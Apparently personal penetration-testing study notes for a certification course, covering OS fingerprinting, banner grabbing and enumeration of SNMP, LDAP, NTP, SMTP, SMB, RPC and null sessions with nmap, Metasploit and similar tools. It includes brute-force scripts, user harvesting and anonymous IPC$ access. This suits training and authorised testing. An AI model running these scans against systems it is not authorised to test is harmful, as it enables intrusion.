| Windows        | NT 4.0                | TCP and UDP  | 128  |
| Windows        | NT 4.0 SP5-           |              | 32   |
| Windows        | NT 4.0 SP6+           |              | 128  |
| Windows        | NT 4 WRKS SP 3, SP 6a | ICMP         | 128  |
| Windows        | NT 4 Server SP4       | ICMP         | 128  |
| Windows        | ME                    | ICMP         | 128  |
| Windows        | 2000 pro              | ICMP/TCP/UDP | 128  |
| Windows        | 2000 family           | ICMP         | 128  |
| Windows        | Server 2003           |              | 128  |
| Windows        | XP                    | ICMP/TCP/UDP | 128  |
| Windows        | Vista                 | ICMP/TCP/UDP | 128  |
| Windows        | 7                     | ICMP/TCP/UDP | 128  |
| Windows        | Server 2008           | ICMP/TCP/UDP | 128  |
| Windows        | 10                    | ICMP/TCP/UDP | 128  |

- Use simple **ping utility** and look for the TTL values to determine the target OS

  ![image-20210819184515145](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210819184515145.png)

- Use **wireshark** to look for the TTL values in order to determine target OS

  ![image-20210819184642573](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210819184642573.png)

- Identify the OS using **p0f**
  P0f is a tool which is a passive traffic fingerprinting technique used to detect the machines behind any TCP/IP communications without interfering. It also used to support in evaluating other aspects of the remote systems. By checking the passive network traffic, pOf can identify the operating system on remote machines.

  **Features:**

  - Fast identification of the  OS and software on both ends of vanilla TCP connection, especially where Nmap probes are blocked 
  - Estimates the distance of remote system and calculate its uptime
  - Network monitoring

  * Detection of unauthorized network interconnects

  Type the following command to determine the target OS using pOf:

  - Syntax: p0f -i any -p -o /temp/sniff.log
        -i: listen on specified network interface
        -p: it put the listening interface in promiscuous mode
        -o: write information to the specified log file

  ```
  #p0f -i any -p -o /tmp/sniff.log
  client   = 192.168.101.110/36293
  | link     = Ethernet or modem
  | raw_mtu  = 1500
  |
  `----
  
  .-[ 192.168.101.110/33801 -> 192.168.101.122/3814 (syn) ]-
  |
  | client   = 192.168.101.110/33801
  | os       = Linux 2.2.x-3.x
  | dist     = 0
  | params   = generic
  | raw_sig  = 4:64+0:0:1460:mss*44,10:mss,sok,ts,nop,ws:df,id+:0
  |
  `----
  ```

- Nmap

  OS version of the remote host is identified by using “Nmap” tool and the result will be based on various aspects such as MAC address, open/closed ports of default OS installation, and operating system fingerprints that are already been submitted to Nmap database by other users.

  To identify the operating system on target machine, use the following command:

  ```
  nmap -O [target IP address]
  ```

  Note: You can also add -v command after the above command to identify OS with verbosity feature.

  **Additional commands to identify 0S in detail are mentioned below:**

  - nmap -sV -0 -v [target IP address]
    This command enables the OS version detection.

  * nmap -T4 -A -v [target IP address]
    In this command, "-A" performs OS checking and version checking and "-T4” is used for the speed template, that is, it tells Nmap to quickly perform the scan. The speed template ranges from 0 to 5, 0—least, and 5 being the fastest.
  * Syntax: --osscan-Limit
    This feature limits OS detection to promising targets,

  + Syntax: --oscan-guess; --fuzzy
    This feature can be used to guess OS detection results,

  + Syntax; --max-os-tries
    This feature can be used to set the maximum number of OS detection tries against a
    target.

- Zenmap

  You can also use Zenmap tool to perform the OS detection. Type the following command in the Command field and type the target IP address in the Target field to perform the OS scan on
   target machine. An example is shown in the below screenshot

    Syntax: nmap -sV -T4 -0 -F -version-light [IP address]

  In the above command,
    -sV: probe open ports to determine the version info/service
    -T: [0-5] set timing template (higher is faster)
    -0: Enable 0S detection
    -F: Fast mode
    =version-Light: limit to most likely probes (intensity 2)

## SMB OS Discovery

```
# nmap --script smb-os-discovery.nse --script-args=unsafe=1 -p 445 10.10.10.10
```

## Manual Banner Grabbing

- telnet

- netcat

  ```
  #nc -vn 192.168.101.122 22
  (UNKNOWN) [192.168.101.122] 22 (ssh) open
  SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
  ```

  

  ![image-20210820065252057](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210820065252057.png)

### Banner Grabbibg with dmitry

```
#dmitry -pb 192.168.101.122
Deepmagic Information Gathering Tool
"There be some deep magic going on"

ERROR: Unable to locate Host Name for 192.168.101.122
Continuing with limited modules
HostIP:192.168.101.122
HostName:

Gathered TCP Port information for 192.168.101.122
---------------------------------

 Port		State

22/tcp		open
>> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
```

### Banner Grabbing with Python

```
#python
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import socket
>>> bangrab = socket.socket(socket.AF_INET, socket .SOCK_STREAM)
>>> bangrab.connect(("192.168.101.112", 22))
>>> bangrab.recv (4096)
b'SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3\r\n'
>>> bangrab.close()
>>> exit()
```

## Identify the Services

- Nmap

  ```
  #nmap -sV [IP Address]
  ```

  -o: option to guess the operating system

- Zenmap

  ```
  #nmap -T4 -a v [IP Address]
  ```

### Identifiying IPSec-Enabled Devices and Hosts

While performing the service scans, you must make sure to identify the loopholes or vulnerable services that exist in the current security implementation and need to change the respective configurations accordingly to protect against the known problems. One of such loopholes is ISAKMP service.

You need to identify the IPsec-based VPNs, because most IPsec-based VPNs use ISAKMP, a part of IKE, to establish, negotiate, modify, and delete security associations (SA) and cryptographic keys in a VPN environment. You can use tools like Nmap to identify the ISAKMP service running on UDP port 500. You can do this by using the following Nmap command:

```
nmap -sU -p 500 [IP address]
```

In the above command, -sU is used for UDP scan and -p is used for specified port scan.

![image-20210820071656735](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210820071656735.png)

### Identifying VoIP Enabled Devices and Hosts

VoIP is mainly used for telecommunication purpose in an organization. The main features of VoIP are to record calls and log results, views of caller details, providing multiple extensions. Due to this features, the VoIPs are prone to external and internal attacks. VoIP penetration testing identifies the type of risks to these telecommunication-based systems which are usually employed in an organization.

VoIP uses SIP (session initiation protocol) to enable voice and video calls over an IP network. SIP generally uses UDP/TCP ports **2000**, **2001**, **5050**, and **5061**. You can use svmap scanner to identify SIP devices and PBX servers on a target network. Run the following symap command to fingerprint VoIP enabled devices:

```
#svmap [IP Address Range]
```

![image-20210820083323823](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210820083323823.png)

### Perform SSH Fingerprinting 

SSH is one of the popularly used applications, which provides security for remote devices. With the help of cryptography, it provides strong authentication and confidentiality. You need to identify the types and versions of SSH software running on the target. You can use SSH version scanner such as ssh_version auxiliary module in the Metasploit framework (MSF) to determine versions of SSH software.

To detect the SSH version on the network, type the following command in a MSF:

- Syntax: search ssh_version

  ```
  msf6 > search ssh_version
  
  Matching Modules
  ================
  
     #  Name                                       Disclosure Date  Rank    Check  Description
     -  ----                                       ---------------  ----    -----  -----------
     0  auxiliary/fuzzers/ssh/ssh_version_15                        normal  No     SSH 1.5 Version Fuzzer
     1  auxiliary/fuzzers/ssh/ssh_version_2                         normal  No     SSH 2.0 Version Fuzzer
     2  auxiliary/fuzzers/ssh/ssh_version_corrupt                   normal  No     SSH Version Corruption
     3  auxiliary/scanner/ssh/ssh_version                           normal  No     SSH Version Scanner
  
  
  Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/ssh/ssh_version
  ```

Now, to gather the information related to ssh_version, type the following command that we   got as a result for the previous search to enter into auxiliary (ssh_version) mode.

- Syntax: use auxiliary/scanner/ssh/ssh_version
  Now type “info” as shown in the below screenshot to extract the required details.

  ```
  msf6 > use auxiliary/scanner/ssh/ssh_version
  msf6 auxiliary(scanner/ssh/ssh_version) > info
  
         Name: SSH Version Scanner
       Module: auxiliary/scanner/ssh/ssh_version
      License: Metasploit Framework License (BSD)
         Rank: Normal
  
  Provided by:
    Daniel van Eeden <metasploit@myname.nl>
  
  Check supported:
    No
  
  Basic options:
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<pa
                                        th>'
    RPORT    22               yes       The target port (TCP)
    THREADS  1                yes       The number of concurrent threads (max one per host)
    TIMEOUT  30               yes       Timeout for the SSH probe
  
  Description:
    Detect SSH Version.
  
  References:
    http://en.wikipedia.org/wiki/SecureShell
  ```

  ```
  msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.101.122
  RHOSTS => 192.168.101.122
  msf6 auxiliary(scanner/ssh/ssh_version) > run
  
  [+] 192.168.101.122:22    - SSH server version: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3 ( service.version=8.2p1 openssh.comment=Ubuntu-4ubuntu0.3 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:8.2p1 os.vendor=Ubuntu os.family=Linux os.product=Linux os.version=20.04 os.cpe23=cpe:/o:canonical:ubuntu_linux:20.04 service.protocol=ssh fingerprint_db=ssh.banner )
  [*] 192.168.101.122:22    - Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  ```

  

### Displaying Services within Metasploit

#### Services Data

```
msf6 > services -c port,proto,created_at 192.168.101.122
Services
========

host             port  proto  created_at
----             ----  -----  ----------
192.168.101.122  22    tcp    2021-08-19 20:05:06 UTC
192.168.101.122  139   tcp    2021-08-19 20:05:06 UTC
192.168.101.122  445   tcp    2021-08-19 20:05:06 UTC
192.168.101.122  8000  tcp    2021-08-19 20:05:06 UTC
192.168.101.122  9000  tcp    2021-08-19 20:05:06 UTC
```

#### Services Port State

```
msf6 > services -c port,proto,state -p 1-300
Services
========

host             port  proto  state
----             ----  -----  -----
192.168.101.2    80    tcp    open
192.168.101.3    22    tcp    open
192.168.101.3    80    tcp    open
192.168.101.110  22    tcp    open
192.168.101.122  22    tcp    open
192.168.101.122  139   tcp    open
```



## Map the Internal Network

Map the Internal Network to Identify:

- Number of subnets

- Number of hosts

- Operating systems running of each hosts

  ![image-20210823094811169](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823094811169.png)



## Enumeration

Enumeration is one of the crucial phases in penetration testing, because the information collected from the enumeration can be directly used for system exploitation. Enumeration is the process of extracting usernames, machine names, network resources, shares, IP tables, routing tables, SNMP and DNS details, and services from a system or network.

### Perform Service Enumeration 

- Enumeration is performed to create active connections with computer system and perform directed queries to gain more information about the organization’s network
- Extracted information is used to identify system attack points and perform password attacks to gain
  unauthorized access to information system resources
- It allows you to gather information about network resources and shares, routing tables, audit and service settings, SNMP and DNS details, machine names, users and groups, applications and banners, etc.
- Try various enumeration techniques such as NetBIOS enumeration, SNMP enumeration, and so on, to collect the information
- Use tools such as SuperScan, Hyena, and Winfingerprint to enumerate users 

### Enumeration Tools

#### SuperScan

Source: https://www.mcafee.com
SuperScan is a connection-based TCP port scanner, pinger, and hostname resolver. It performs ping sweeps and scans any IP range with multi-threading and asynchronous techniques.

![image-20210823095356188](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823095356188.png)

#### Winfingerprint

Source: https://github.com

Winfingerprint is a host/network enumeration scanner. It is capable of performing SMB, TCP, UDP, ICMP, RPC, and SNMP scans. Winfingerprint input options include IP range (Netmask and Inverted Netmask supported), IP list, single host, and neighborhood. Using SMB, Winfingerprint can enumerate OSs, users, groups, SIDs, password policies, services, service packs and hotfixes, NETBIOS shares, transports, sessions, disks, security event log, and time of day utilizing NT domain (NET*), Active Directory, or WMI application programing interfaces (APIs).

![image-20210823095810664](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823095810664.png)



### Enumeration Targets

- TCP 53 : DNS Zone Transfer
- UDP 137 : NetBIOS Name Service
- TCP 139 : NetBIOS Session Service (SMB over NetBIOS)
- UDP 161 : Simple Network Management Protocol (SNMP)
- TCP/UDP 389 : Lightweight Directory Access Protocol (LDAP)
- TCP 445 : SMB over TCP/IP
- TCP/UDP 3268 : Global Catalog Service

### Enumeration Tools

![image-20210823101824589](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823101824589.png)

![image-20210823101904190](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823101904190.png)

#### Nbststat

Source: https://docs.microsoft.com
Nbtstat is a Windows utility that helps in troubleshooting NETBIOS name-resolution problems. The Nbtstat command removes and corrects preloaded entries using a number of case-sensitive switches. It displays NetBIOS over TCP/IP protocol statistics, NetBIOS name tables for both local and remote computers, and the NetBIOS name cache. Nbtstat allows a refresh of the NetBIOS name cache and the names registered
with Windows Internet Name Service. For any additional help, type the Nbtstat command without parameters.

Following is the syntax used for performing Nbtstat:
Syntax: nbtstat [-a RemoteName] [-A IPAddress] [-c] [-n] [-r] [-R] [-RR] [-s] [-S] [Interval]

The table shown below displays various Nbtstat parameters and their respective
functions:

| Nbstat Parameters | Function                                                     |
| ----------------- | ------------------------------------------------------------ |
| -a RemoteName     | Displays the NetBIOS name table of a remote computer, where Displays the NetBIOS name table of a remote computer |
| -A IPAddress      | Displays the NetBIOS name table of a remote computer, specified by the IP address (in dotted decimal notation) of the remote computer |
| -c                | Lists the contents of the NetBIOS name cache, the table of NetBIOS names, and their resolved IP addresses |
| -n                | Displays the names registered locally by NetBIOS applications such as the server and redirector |
| -r                | Displays a count of all names resolved by broadcast or WINS server |
| -R                | Purges the name cache and reloads all #PRE entries from LMHOSTS. |
| -RR               | Releases and reregisters all names with the name server      |
| -s                | Lists the NetBIOS sessions table converting destination IP addresses to computer NetBIOS names. |
| -S                | Lists the current NetBIOS sessions and their status with the IP addresses |
| Interval          | Redisplays selected statistics, pausing the number of seconds specified in interval between each display |

To get the list of NetBIOS name cache, type which contains name-to-address mapping for other computers:

- Syntax: nbtstat -c

  ![image-20210823104450781](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823104450781.png)

To display the NetBIOS name table of a remote computer, where RemoteName is the NetBIOS computer name of the remote computer:

- Syntax: nbtstat.exe -a [IP address] 

  ![image-20210823104618466](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823104618466.png)

#### Hyena

Source: https://www.systemtools.com

Explorer-style interface for all operations. It supports management of users, groups (both local and global), shares, domains, computers, services, devices, events, files, printers, print jobs, sessions, open files, disk space, user rights, messaging, exporting, job scheduling, processes, and printing. It shows shares and user logon names for Windows servers and domain controllers.

It displays a graphical representation of Microsoft Terminal Services, Microsoft Windows Network, Web Client Network, and so on.

- Group member matrix: Presents all members of multiple groups in a simple grid including direct, indirect (nested), and primary membership. 
- Active editor improvements: The new release of Hyena includes new feature enhancements to the editor, including support for multivalued attributes and account expiration date as well as multi-selection and update capabilities.

![image-20210823104827874](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823104827874.png)

#### Nbtscan

```
#nbtscan -v -s : 192.168.101.0/24
192.168.101.0	Sendto failed: Permission denied
192.168.101.122:OWENBOX        :00U
192.168.101.122:OWENBOX        :03U
192.168.101.122:OWENBOX        :20U
192.168.101.122:__MSBROWSE__:01G
192.168.101.122:WORKGROUP      :00G
192.168.101.122:WORKGROUP      :1dU
192.168.101.122:WORKGROUP      :1eG
192.168.101.122:MAC:00:00:00:00:00:00
192.168.101.113:DESKTOP-B466P06:20U
192.168.101.113:DESKTOP-B466P06:00U
192.168.101.113:WORKGROUP      :00G
192.168.101.113:WORKGROUP      :1eG
192.168.101.113:MAC:60:6c:66:af:04:e2
192.168.101.255	Sendto failed: Permission denied
```

## SNMP

- SNMP is a gift
- Database full of information
- Default community name of public and private
- Runs on UDP port 161

### Check SNMP

```
nmap -sU -p 161 [IP Address]
```

### Enumerate database

```
snmpwalk -Os -c public -v 1 [IP address]
```

### SNMP and Nmap

- Multiple scripts available

  ```
  #ls -l /usr/share/nmap/scripts/ | grep snmp
  -rw-r--r-- 1 root root  7814 Oct 12  2020 snmp-brute.nse
  -rw-r--r-- 1 root root  4388 Oct 12  2020 snmp-hh3c-logins.nse
  -rw-r--r-- 1 root root  5216 Oct 12  2020 snmp-info.nse
  -rw-r--r-- 1 root root 28644 Oct 12  2020 snmp-interfaces.nse
  -rw-r--r-- 1 root root  5978 Oct 12  2020 snmp-ios-config.nse
  -rw-r--r-- 1 root root  4156 Oct 12  2020 snmp-netstat.nse
  -rw-r--r-- 1 root root  4431 Oct 12  2020 snmp-processes.nse
  -rw-r--r-- 1 root root  1867 Oct 12  2020 snmp-sysdescr.nse
  -rw-r--r-- 1 root root  2570 Oct 12  2020 snmp-win32-services.nse
  -rw-r--r-- 1 root root  2739 Oct 12  2020 snmp-win32-shares.nse
  -rw-r--r-- 1 root root  4713 Oct 12  2020 snmp-win32-software.nse
  -rw-r--r-- 1 root root  2016 Oct 12  2020 snmp-win32-users.nse
  ```

### Perform SNMP Enumeration

SNMP contains two passwords for configuring and accessing the SNMP agent from the management station.

The two SNMP passwords are:

- Read community string
  Configuration of the device or system can be viewed with the help of this password. These strings are public.

- Read/Write community string
  Configuration on the device can be changed or edited using this password. These strings are private.
  When administrators leave the community strings at the default setting, you can use these default community strings (passwords) for changing or viewing the configuration of the device or system. You can enumerate SNMP to extract information about network resource (such as hosts, routers, devices, and shares) and network information such as ARP tables, routing tables, device specific information, and traffic statistics. 

  You can use tools such as OpUtils, Engineer’s Toolset, and so on NetScanTools Pro, to
  perform SNMP enumeration.

  - **OpuUtils**
    Source: https://www.manageengine.com
    OpUtils is switch port and IP address management software. It contains a collection of tools that network engineers can use to monitor, diagnose, and troubleshoot networking issues. With OpUtils, you can manage IP addresses, map switch ports, detect rogue devices, monitor bandwidth usage, monitor DHCP servers, backup Cisco config files, view SNMP traps sent from network devices, get MAC IP lists, monitor and troubleshoot the network, and so on.

    ![image-20210823110636135](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823110636135.png)

## LDAP Enumeration

### Perform LDAP Enumeration

Various protocols enable communication and manage data transfer between network resources. All  of these protocols carry valuable information about network resources along with the data. An external user who is able to enumerate that information by manipulating the protocols can break into the network and may misuse the network resources. The LDAP is one such protocol that accesses the directory listings. This topic focuses on LDAP enumeration, information extracted via LDAP enumeration, and LDAP enumeration tools.

LDAP accesses directory listings within an active directory or from other directory services. LDAP is a hierarchy or logical form of a directory, similar to a company’s organizational chart. It uses DNS for quick lookups and fast resolution of queries. A client starts an LDAP session by connecting to a directory system agent (DSA), typically on TCP port 389, and sends an operation request to the DSA. Basic encoding rules transmit information between the client and the server. You can anonymously query the LDAP service for sensitive information (such as usernames, addresses, departmental details, and server names), which you can use to launch attacks.

You can use tools such as Softerra LDAP Administrator, LDAP Admin Tool, and LDAP Account Manager, to perform LDAP enumeration.

- **Softerra LDAP Administrator**

  Source: https://www.|dapadministrator.com

  Softerra LDAP administrator is an LDAP administration tool that works with LDAP servers such as Active Directory, Novell Directory Services, and Netscape/iPlanet. It browses and manages LDAP directories. It provides a wide variety of features essential for LDAP development, deployment, and administration of directories.

  It provides directory search facilities, bulk update operations, and group-membership management facilities and supports LDAP-SQL, which allows managing LDAP entries using SQL-like syntax.

  ![image-20210823111219057](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823111219057.png)

- Nmap

  When we discover LDAP use Nmap to brute force the naming data

  ```
  namp -sS -sU -p 389 -v [IP Address] -oA ldap-script-results --open --script ldap-brute,ldap-rootdse
  ```

   ![image-20210823111834673](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823111834673.png)

  Extract Directory Services Data

  ![image-20210823112001547](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823112001547.png)

### Perform NTP Enumeration

NTP is designed to synchronize clocks of networked computers. It uses UDP port 123 as its primary means of communication. NTP can maintain time to within 10 ms (1/100 s) over the public Internet and can achieve accuracies of 200 1s or better in local area networks under ideal conditions.

You can query NTP server to gather valuable information such as:

- List of hosts connected to NTP server

- Client's IP addresses in a network, their system names, and OSs

- Internal IPs can also be obtained if the NTP server is in the DMZ

**NTP Enumeration Commands**
NTP enumeration commands include ntptrace, ntpdc, and ntpq to query the NTP server for valuable information.

* **ntptrace**
  This command determines from where the NTP server gets time and follows the chain of NTP servers back to its prime time source.

  Syntax: ntptrace [-vdn] [-r retries] [-t timeout] [servername/IP_address] [...]

  Following are the options that you can use along with ntptrace command:

  | Options    | Description                                                  |
  | ---------- | ------------------------------------------------------------ |
  | - a        | Diplay debugsing cutout                                      |
  | -n         | Does not print host names only IP addresses; may be useful if a nameserver is down |
  | -r retries | Sets the number of retransmission attempts for each host (default = 5) |
  | -t timeout | Set the retransmission timeout (in seconds) (default = 2)    |
  | -v         | Prints verbose information about the NTP servers             |

  ![image-20210823113351283](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823113351283.png)

- **ntpdc**

  Syntax: ntpdc [-ilnps] [-c command] [hostname/IP_address] [...]
  This command queries the ntpdc daemon about its current state and requests changes in that state.
  Following are the options that you can use along with ntpdc command:

  | Options | Description                                                  |
  | ------- | ------------------------------------------------------------ |
  | -c      | Following argument is interpreted as an interactive format command; multiple -c options may be given |
  | -i      | Force ntpdc to operate in interactive mode                   |
  | -l      | Obtain a list of peers known to the server(s); this switch is equivalent to -c listpeers |
  | -n      | Output all host addresses in dotted-quad numeric format rather than host names |
  | -p      | Print a list of the peers as well as a summary of their state; this is equivalent to -c<br/>peers |
  | -s      | Print a list of the peers as well as a summary of their state; this is equivalent to -c<br/>dmpeers |

  **Note**: Type “?” command to get the ntpdc queries where you can be used to obtain additional NTP server information.

  monlist query in ntpdc is used to obtain the list of the last 600 hosts that are connected to the server.

  ![image-20210823114004209](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823114004209.png)

- **ntpq**
  Syntax: ntpq [-inp] [-c command] [host/IP_address] [...]
  This command monitors NTP daemon ntpd operations and determines performance.
  Following are the options that you can use along with ntpq command:

  | Options | Description                                                  |
  | ------- | ------------------------------------------------------------ |
  | -c      | Folowwing arguments is an interactive format command; multiple -c options may be given |
  | -d      | Debugging mode                                               |
  | -i      | Force ntpq to operate in interactive mode                    |
  | -n      | Output all host addresses in dotted-quad numeric format rather than host names |
  | -p      | Print a list of the peers as well as a summary of their state |

  For example:

- ntpq> version
  ntpq 4.2.0a@1.1196-r Mon May 07 14:14:14 EDT 2006 (1)

- ntpq> host
  current host is 192.168.0.1

  Note: Type “?” command to get the ntpq queries where you can be used to obtain additional NTP server information. “readlist” command is used to request the values of the variables in the internal variable list be returned by the server. If the association ID [associd] is 0 or rejected, the variables are expected to be system variable. Or else, they are treated as peer variables.

  ![image-20210823114731140](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823114731140.png)

### Perform SMTP Enumeration

Mail systems commonly use SMTP with POP3 and IMAP that enables users to save the messages in the server mailbox and download them occasionally from the server. SMTP uses mail exchange servers to direct the mail via DNS. It runs on TCP port 25. 

Follow the below steps for performing SMTP enumeration:

- First, use telnet command to interact with SMTP and to collect list of valid users on the
  SMTP server.

- Next, use SMTP built-in-commands VREY, EXPN, RCPT TO:

  - VRFY -Validates users

  - EXPN - Tells the actual delivery addresses of aliases and mailing lists

  - RCPT TO - Defines the recipients of the message

**Use the SMTP VRFY command**

```
telnet 192.168.168.1 25
Trying 192.168.168.1 ...
Connected to 192.168.168.1 
Escape character is "*]"
220 NYmailserver ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
VRFY Jonathan
250 Super-User <Jonathan@NYmailserver>
VRFY Smith
550 Smith. User unknown
```



**Use the SMTP EXPN Command**

```
telnet 192.168.168.1 25
Trying 192.168.168.1 ...
Connected to 192.168.168.1
Escape character is "*]"
220 NYmailserver ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 NYmailserver Hello [10.0.0.86], pleased to meet you
EXPN Jonathan
250 Super-User <Jonathan@NYmailserver>
EXPN Smith
550 Smith. User unknown
```



**Use the SMTP RCPT TO Command**

```
telnet 192.168.168.1 25
Trying 192.168.168.1 ...
Connected to 192.168.168.1
Escape character is "*]
220 NYmailserver ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 NYmailserver Hello [10.0.0.86], pleased to meet you
MAIL FROM: Jonathan
250 Jonathan. Sender ok
RCPT TO:Ryder
250 Ryde. Recipient ok
RCPT TO: Smith
550 Smith. User unknown
```



### Perform IPSec Enumeration

You need to enumerate |Psec-enabled devices and Hosts. IPSec scan is a Win32 command line utility that can scan single or multiple IP addresses to identify |Psec-enabled devices and hosts. First, you need to scan all the IP addresses using IPSec scan, and once you identify ISAKMP services running on UDP port 500, then you can use tools like ike-scan to enumerate the sensitive information including encryption and hashing algorithm, authentication type, key distribution algorithm, SA, LifeDuration, and so on.

Syntax: **# ike-scan -M [IP address]**

![image-20210823120258080](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823120258080.png)

You can also use ike-scan --showbackoff 10.0.0.3 10.0.0.6 command to get the IKE backoff patterns. By looking at the pattern or implementation, device can be guessed.



### Perform VoIP Enumeration

VoIP gateway/servers, IP-PBX systems, client software, client software, and user extensions are the useful information to be gained from VoIP network. You can attempt to gain access to the VoIP network for the purpose of recording conversations or to perform DoS to the company’s voice communications network. In some cases, if the organization has not followed the established “best practices” for VoIP, the team may attempt to use the VoIP network as a jumping-off point to conduct further compromise of the rganization’s network backbone.

Try to enumerate VolP-enabled devices and hosts. Enumerate SIP services to obtain sensitive information such as VoIP gateway/servers, IP-PBX systems, client software (softphones)/VoIP phones, user agent, IP addresses, and user extensions. You can do this by following metasploit command:

Syntax: **msf> use auxiliary/scanner/sip/enumerator**

![image-20210823120538449](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823120538449.png)

Following are some of the tools helpful for VoIP enumeration:

- **Smap**
  Smap is a software tool that can find Asterisk boxes, ATAs, or SIP phones and PC with softphones enabled and listening VoIP ports. It scans a single or range of IP addresses for SIP-enabled devices.

- **Svmap**
  Svmap is inexpensive and open source scanner to determine enabled sip devices and PBX servers. It can scan a range of networks and can get all the phones on the network to ring simultaneously. While enumerating SIP devices, we can select the type of request. In the below figure, it shows that svmap is able to detect IP address and user-agent details.

  ![image-20210823120731752](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823120731752.png)

### Perform SMB Enumeration

SMB protocol generally used for providing shared access to files, printers, and serial ports. By default, SMB runs directly on TCP 445 port or via NetBIOS API on UDP ports 137, 138, and TCP ports 137, 139.

Run the Zenmap scan to find the above ports open. Type **nmap -p 139,445 [IP address] ]** in the Command field and in the Target text field type IP address of the target host as shown in the below figure.

![image-20210823120945719](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823120945719.png)

Because common sharing services or other unused services may provide you the doorway to break into a network’s security, SMB is a protocol that provides shared access to files, serial ports, printers, and communications between nodes on a network. If this service is running on a network, then there is a high possibility of enumeration via SMB. SMB enumeration provides a good amount of information about the target. Scan your own network for open SMB shares. You can use tools such as NetScanTools Pro and ShareEnum by domain/workgroup or IP range to find SMB shares.

- **NetScanTools Pro**

  Source: https://www.netscantools.com

  NetScanTools Pro is an integrated collection of Internet information gathering and network troubleshooting utilities for network professionals. Research for IPv4 addresses, IPv6 addresses, hostnames, domain names, email addresses, and URLs automatically or with manual tools. It is designed for the Windows operating system.

  ![image-20210823121206491](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823121206491.png)

- **ShareEnum**

  Source: https://docs.microsoft.com

  This tool allows the user to view and monitor the computer’s file-sharing activities. It scans the system and creates a record of file-sharing activities that display information on the recipient, sender, file type, file name, and so on. It also displays the information on the network hosting the file transfer. It has two main components: NetShareEnum for networks and WNetEnumResource for Windows APIs.

  ![image-20210823121324102](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823121324102.png)

### Perform RPC Enumeration

Remote procedure call (RPC) is a protocol that is used by a computer to communicate or request any other computer in the network without having to understand the network's details. 
You can enumerate the RPC service information by using the following rpcdump command:
Syntax: rpcdump [-v] [-p protseq] [target]

Now, to enumerate the service information and to get access to the RPC endpoint mapper, following protocol sequences can be used:

- ncacn_np (\pipe\epmapper named pipe through SMB)

- ncacn_ip_tco (direct access to TCP port 135)

- ncadg_ip_udp (direct access to UDP port 135)

- ncacn_http (RPC over HTTP on TCP port 80, 593)

You can also use tools like Nmap, NetScanTools Pro, etc., to enumerate RPC endpoints.

- **Zenmap**
  Source: https://www.nmap.org
  In Zenmap, type the following command in the Command field:
  Syntax: nmap -T4 -A [IP address] 

  In the Target text field, type the IP address as shown in the following figure. The results
  are highlighted with red box in the screenshot.

  ![image-20210823121705419](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823121705419.png)

- NetScanTools Pro
  Source: https://www.netscantools.com
  In NetScanTools pro, navigate to Manual Tools (all) tab in the left-pane and scroll till you find *nix RPC Info icon as shown in the screenshot. Fill the fields like target IP address, port number, and so on as shown in the screenshot and click TCP Ping to perform RPC enumeration.

  ![image-20210823125904167](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823125904167.png)

### Perform Null Session Enumeration

The null session is nothing but an anonymous access to the server, which means no need of authentication while establishing the session (no username and password credentials are used while establishing the session). The null session is usually performed to gather the information about the system. You can use remote procedure calls and API calls to gather this information. By using this technique, you can gather information on groups, services, passwords, active processors, and users. It is also used to perform DoS attacks and used for escalating privileges.

As a penetration tester, verify if null sessions are enabled on the target machine. If possible, establish null sessions and enumerate users in the system. 

**Note**: Windows Server 2008, Windows XP, Windows 7, and Windows 8 do not allow null session connections.

To establish the null session in Windows-based systems, use the following command:

- Syntax: **net use \\\10.10.10.12\IPC$ "" /u: ""**
  The preceding syntax connects to the hidden inter process communications share (IPC$) at IP address 10.10.10.12 as the built-in anonymous user (/u:*”) with a null (*”) password. If successful, you have an open channel over which to attempt various techniques that can be used to gather as much information as possible from the target, that is. network information. shares. users. groups. registry keys. and so on.

  To know the information on all commands of “net use”, you can add “/?” as shown in the figure:

  ![image-20210823130911516](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823130911516.png)

